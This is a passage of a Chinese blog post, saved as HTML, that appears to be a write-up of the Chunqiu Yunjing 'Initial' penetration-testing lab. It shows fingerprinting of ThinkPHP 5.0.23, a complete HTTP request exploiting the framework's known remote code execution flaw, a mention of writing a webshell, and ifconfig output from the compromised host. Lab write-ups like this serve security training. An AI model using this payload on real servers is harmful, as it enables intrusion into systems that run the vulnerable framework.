@@ -1,0 +1,544 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="scroll-smooth" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://exp10it.io/posts/chunqiuyunjing-initial-writeup/"><meta name="generator" content="Astro v5.12.0"><!-- General Meta Tags --><title>春秋云镜 Initial Writeup | X1r0z Blog</title><meta name="title" content="春秋云镜 Initial Writeup | X1r0z Blog"><meta name="description" content="春秋云镜 Initial Writeup"><meta name="author" content="X1r0z"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="春秋云镜 Initial Writeup | X1r0z Blog"><meta property="og:description" content="春秋云镜 Initial Writeup"><meta property="og:url" content="https://exp10it.io/posts/chunqiuyunjing-initial-writeup/"><meta property="og:image" content="https://exp10it.io/og.png"><!-- Article Published/Modified time --><meta property="article:published_time" content="2023-07-28T00:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://exp10it.io/posts/chunqiuyunjing-initial-writeup/"><meta property="twitter:title" content="春秋云镜 Initial Writeup | X1r0z Blog"><meta property="twitter:description" content="春秋云镜 Initial Writeup"><meta property="twitter:image" content="https://exp10it.io/og.png"><!-- Google JSON-LD Structured data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"春秋云镜 Initial Writeup | X1r0z Blog","image":"https://exp10it.io/og.png","datePublished":"2023-07-28T00:00:00.000Z","author":[{"@type":"Person","name":"X1r0z","url":"https://exp10it.io/"}]}</script><!-- Enable RSS feed auto-discovery  --><!-- https://docs.astro.build/en/recipes/rss/#enabling-rss-feed-auto-discovery --><link rel="alternate" type="application/rss+xml" title="X1r0z Blog" href="https://exp10it.io/rss.xml"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.D98dxaWf.js"></script><script src="/toggle-theme.js"></script><link rel="stylesheet" href="/_astro/about.Cn_dDryL.css">
+<style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
+</style><style>[data-astro-transition-scope="astro-fam6wyqg-1"] { view-transition-name: \6625\79CB\4E91\955C-initial-writeup; }@layer astro { ::view-transition-old(\6625\79CB\4E91\955C-initial-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\6625\79CB\4E91\955C-initial-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\6625\79CB\4E91\955C-initial-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\6625\79CB\4E91\955C-initial-writeup) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-fam6wyqg-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-fam6wyqg-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-2"] { view-transition-name: windows; }@layer astro { ::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(windows) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-36ssibgs-3"] { view-transition-name: active-directory; }@layer astro { ::view-transition-old(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(active-directory) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-36ssibgs-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-36ssibgs-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head> <body data-astro-cid-sckkx6r4>  <header> <a id="skip-to-content" href="#main-content" class="absolute start-16 -top-full z-50 bg-background px-3 py-2 text-accent backdrop-blur-lg transition-all focus:top-4">
+Skip to content
+</a> <div id="nav-container" class="mx-auto flex max-w-app flex-col items-center justify-between sm:flex-row"> <div id="top-nav-wrap" class="relative flex w-full items-baseline justify-between bg-background p-4 sm:items-center sm:py-6"> <a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none"> X1r0z Blog </a> <nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"> <button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 6h16" /><path d="M7 12h13" /><path d="M10 18h10" /></svg> </button> <ul id="menu-items" class="mt-4 grid w-44 grid-cols-2 place-content-center gap-2 [&#38;>li>a]:block [&#38;>li>a]:px-4 [&#38;>li>a]:py-3 [&#38;>li>a]:text-center [&#38;>li>a]:font-medium [&#38;>li>a]:hover:text-accent sm:[&#38;>li>a]:px-2 sm:[&#38;>li>a]:py-1 hidden sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0"> <li class="col-span-2"> <a href="/posts" class="active-nav">
+Posts
+</a> </li> <li class="col-span-2"> <a href="/tags">
+Tags
+</a> </li> <li class="col-span-2"> <a href="/links">
+Links
+</a> </li> <li class="col-span-2"> <a href="/about">
+About
+</a> </li> <li class="col-span-2"> <a href="/archives" class="group inline-block hover:text-accent focus-outline flex justify-center p-3 sm:p-1" aria-label="archives" title="Archives"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden sm:inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 4m0 2a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v0a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2z" /><path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" /><path d="M10 12l4 0" /></svg> <span class="sm:sr-only">Archives</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <a href="/search" class="group inline-block hover:text-accent focus-outline flex p-3 sm:p-1" aria-label="search" title="Search"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-search"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg> <span class="sr-only">Search</span> </a> </li> <li class="col-span-1 flex items-center justify-center"> <button id="theme-btn" class="focus-outline relative size-12 p-4 sm:size-8 hover:[&>svg]:stroke-accent" title="Toggles light & dark" aria-label="auto" aria-live="polite"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" /></svg> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute top-[50%] left-[50%] -translate-[50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" /><path d="M6.343 17.657l-1.414 1.414" /><path d="M6.343 6.343l-1.414 -1.414" /><path d="M17.657 6.343l1.414 -1.414" /><path d="M17.657 17.657l1.414 1.414" /><path d="M4 12h-2" /><path d="M12 4v-2" /><path d="M20 12h2" /><path d="M12 20v2" /></svg> </button> </li> </ul> </nav> </div> </div> <div class="mx-auto max-w-app px-4"> <hr class="border-border" aria-hidden="true"> </div> </header> <script type="module">function s(){const e=document.querySelector("#menu-btn"),t=document.querySelector("#menu-items"),n=document.querySelector("#menu-icon"),o=document.querySelector("#close-icon");!e||!t||!n||!o||e.addEventListener("click",()=>{const c=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",c?"false":"true"),e.setAttribute("aria-label",c?"Open Menu":"Close Menu"),t.classList.toggle("hidden"),n.classList.toggle("hidden"),o.classList.toggle("hidden")})}s();document.addEventListener("astro:after-swap",s);</script> <div class="mx-auto flex w-full max-w-app items-center justify-start px-2"><a id="back-button" href="/" class="group inline-block hover:text-accent focus-outline mt-8 mb-2 flex hover:text-foreground/75"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg><span>Go back</span></a></div><script type="module">function o(){const t=document.querySelector("#back-button"),e=sessionStorage.getItem("backUrl");e&&t&&(t.href=e)}document.addEventListener("astro:page-load",o);o();</script> <main id="main-content" class="mx-auto w-full max-w-app px-4 pb-12" data-pagefind-body> <h1 class="inline-block text-2xl font-bold text-accent sm:text-3xl" data-astro-transition-scope="astro-fam6wyqg-1"> 春秋云镜 Initial Writeup </h1> <div class="my-2 flex items-center gap-2"> <div class="flex items-center gap-x-2 opacity-80"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 min-w-[1.375rem]"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z" /><path d="M16 3v4" /><path d="M8 3v4" /><path d="M4 11h16" /><path d="M7 14h.013" /><path d="M10.01 14h.005" /><path d="M13.01 14h.005" /><path d="M16.015 14h.005" /><path d="M13.015 17h.005" /><path d="M7.01 17h.005" /><path d="M10.01 17h.005" /></svg>  <time class="text-sm sm:text-base" datetime="2023-07-28T00:00:00.000Z">28 Jul, 2023</time> </div> <span aria-hidden="true" class="max-sm:hidden">|</span> <a href="https://github.com/X1r0z/exp10it.io/edit/master/src/data/pentest/chunqiuyunjing-initial-writeup.md" target="_blank" rel="noopener noreferrer" class="flex justify-baseline gap-1.5 opacity-80 hover:text-accent max-sm:hidden"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 7h-1a2 2 0 0 0 -2 2v9a2 2 0 0 0 2 2h9a2 2 0 0 0 2 -2v-1" /><path d="M20.385 6.585a2.1 2.1 0 0 0 -2.97 -2.97l-8.415 8.385v3h3l8.385 -8.415z" /><path d="M16 5l3 3" /></svg><span>Edit page</span></a> </div> <article id="article" class="app-prose mx-auto mt-8 max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg)"> <h2 id="table-of-contents">Table of contents</h2>
+<p></p><details><summary>Open Table of contents</summary><p></p>
+<ul>
+<li><a href="#flag01">flag01</a></li>
+<li><a href="#flag02">flag02</a></li>
+<li><a href="#flag03">flag03</a></li>
+</ul>
+<p></p></details><p></p>
+<h2 id="flag01">flag01</h2>
+<p>入口点</p>
+<p><img src="https://img.exp10it.io/img/202307282037549.png" alt="image-20230728203700498"></p>
+<p>根据 favicon 和报错确定是 thinkphp 5.0.23</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://39.99.144.193/index.php?s=xx</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307282039206.png" alt="image-20230728203912177"></p>
+<p>网上随便找个 exp</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST /index.php?s=captcha HTTP/1.1</span></span>
+<span class="line"><span>Host: 39.99.144.193</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span>
+<span class="line"><span>Connection: close</span></span>
+<span class="line"><span>Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>Content-Length: 72</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>_method=__construct&#x26;filter[]=system&#x26;method=get&#x26;server[REQUEST_METHOD]=id</span></span></code></pre>
+<p><img src="https://img.exp10it.io/img/202307282040043.png" alt="image-20230728204026019"></p>
+<p>然后写 shell 蚁剑连接</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="--shiki-light:#24292eff;--shiki-dark:#d6deeb;--shiki-light-bg:#ffffff;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="shell"><code><span class="line"><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">www-data:/var/www/html</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">) </span><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">$</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ifconfig</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">eth0:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> flags=</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">4163</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">UP,BROADCAST,RUNNING,MULTICAS</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">T</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  mtu</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 1500</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        inet</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 172.22.1.15</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  netmask</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 255.255.0.0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  broadcast</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 172.22.255.255</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        inet6</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> fe80::216:3eff:fe0e:db2b</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  prefixlen</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 64</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  scopeid</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0x20</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">lin</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">k</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        ether</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> 00:16:3e:0e:db:2b</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  txqueuelen</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 1000</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  (Ethernet)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        RX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> packets</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 66233</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  bytes</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 65649450</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (65.6 </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">MB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        RX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> errors</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  dropped</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  overruns</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  frame</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        TX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> packets</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 20340</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  bytes</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 7965714</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB"> (7.9 </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">MB</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        TX</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> errors</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  dropped</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> overruns</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  carrier</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  collisions</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">lo:</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> flags=</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C">73</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">UP,LOOPBACK,RUNNIN</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">G</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">></span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  mtu</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 65536</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        inet</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 127.0.0.1</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  netmask</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 255.0.0.0</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        inet6</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D"> ::1</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  prefixlen</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 128</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  scopeid</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 0x10</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">&#x3C;</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">hos</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">t</span><span style="--shiki-light:#D32F2F;--shiki-dark:#7FDBCA">></span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-light-font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">        loop</span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">  txqueuelen</span><span style="--shiki-light:#1976D2;--shiki-dark:#F78C6C"> 1000</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">  (Local </span><span style="--shiki-light:#2B5581;--shiki-dark:#ECC48D">Loopback</span><span style="--shiki-light:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
